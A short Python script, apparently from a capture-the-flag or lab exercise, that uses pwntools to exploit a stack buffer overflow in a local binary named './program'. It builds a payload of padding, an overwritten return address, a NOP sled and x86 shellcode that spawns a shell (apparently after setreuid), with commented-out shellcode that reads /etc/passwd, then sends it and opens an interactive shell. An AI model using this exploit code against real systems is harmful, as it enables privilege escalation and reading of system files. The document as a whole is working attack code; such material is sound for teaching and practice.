# import pwn
import pwn
import sys

# shellcode = "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"
shellcode = "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"

buffsize = 172
buff = 'A' * buffsize
eip = pwn.pack(0xffffd6c0 + 50)
# eip = pwn.pack(0xffffd6f0 + 10)
nops = "\x90" * 50
payload = buff + eip + nops + shellcode

open('exploit.txt', 'w').write(payload)

if 2 == len(sys.argv) and 'pwn' == sys.argv[1]:
    elf = pwn.ELF('./program')

    p = elf.process()
    # line = p.recvuntil("Enter")
    # print(line)
    # print(p.recvall())
    p.sendline(payload)
    p.interactive()

else:
    print(payload)
